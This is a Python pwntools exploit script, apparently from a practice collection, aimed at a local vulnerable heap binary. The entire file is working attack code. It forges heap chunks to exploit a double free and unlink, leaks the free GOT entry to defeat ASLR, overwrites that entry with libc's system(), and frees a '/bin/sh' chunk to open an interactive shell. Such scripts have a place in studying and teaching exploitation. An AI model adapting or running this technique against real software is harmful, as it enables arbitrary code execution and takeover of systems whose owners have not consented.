#! /usr/bin/python
#coding:utf-8
'''Heap_DoubleFree - Ret2libc (ALSR - on)'''

import sys
sys.path.append("..")
from pwn import *

class exploit(object):
    'exploit6'
    def __init__(self):
        self.options={'dIP': '127.0.0.1', 'dPort': 12345}
        self.property = {
            'libc_free':0x0,
            'libc_sys':0x0,
            '&p0':0x0,
            'got':0x0    #in fact gets@got
            }
    def test(self):
        # find libc
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        self.property['libc_sys'] = libc.symbols['system']
        self.property['libc_free'] = libc.symbols['free']
        # find &p0 and got
        libc = ELF('../../vulnerabilities/heap/heap64')
        self.property['got'] = libc.got['free']      #use free
        self.property['&p0'] = libc.symbols['a'] + 8*2000
        print self.property

        # begin exploit
        ip, port = self.options['dIP'], int(self.options['dPort'])
        p = remote(ip, port)
        _ = raw_input("Press Any Key to Begin.")

        def new_chunk(size,content):
            while p.can_recv() : p.recvline()
            p.sendline('m')
            p.recvline() # malloc
            p.recvline() # size
            p.sendline(str(size))
            p.recvline() # content
            p.sendline(content)
            p.recvuntil('!\n') # ok

        def free_chunk(no):
            while p.can_recv() : p.recvline()
            p.sendline('f')
            p.recvline() # free
            p.sendline(str(no))
            p.recvuntil('!\n') # ok

        def edit_chunk(no,content):
            while p.can_recv() : p.recvline()
            p.sendline('e')
            p.recvline() # edit
            p.sendline(str(no))
            p.sendline(content)
            p.recvline('!\n') # ok

        def print_chunk(no):
            while p.can_recv() : p.recvline()
            p.sendline('p')
            p.recvline() # print
            p.sendline(str(no))
            return p.recvuntil('end')

        new_chunk(504,'A'*504)
        new_chunk(512,'B'*512)

        free_chunk(0)
        free_chunk(1)

        #关键payload
        content = p64(0x0)  + p64(0x1f1) + p64(self.property['&p0'] - 0x18) + p64(self.property['&p0'] - 0x10) + 'a' * (0x200 - 48) + p64(0x1f0) + p64(0x110)
        new_chunk(768, content)

        new_chunk(20,'/bin/sh')

        free_chunk(1)

        print 'double free !'
        content = 'a'*24 + p64(self.property['got'])
        edit_chunk(0,content)


        # leak GOT
        print 'leak GOT...'
        print 'GOT: ',self.property['got']
        rec = print_chunk(0)

        free_addr = u64(rec[0:6]+'\x00\x00')        #because 64bit address begin with 0x0000 so we only read 6bytes

        sys_addr = free_addr - self.property['libc_free'] + self.property['libc_sys']

        print '\t\tfree_addr = ' + hex(free_addr)
        print '\t\tsystem_addr = ' + hex(sys_addr)

        # overwrite GOT
        print 'overwrite GOT...'
        content = p64(sys_addr)[0:-2]   #for 0x00
        print 'content: ', (content)
        print type(content)
        edit_chunk(0,content)


        while p.can_recv() : p.recvline()
        p.sendline('f')
        p.recvline() # free
        p.sendline('3')

        print "\tfree(a[2003]) ===> system('/bin/sh')"
        p.interactive()





if __name__=='__main__':
    exp=exploit()
    exp.test()



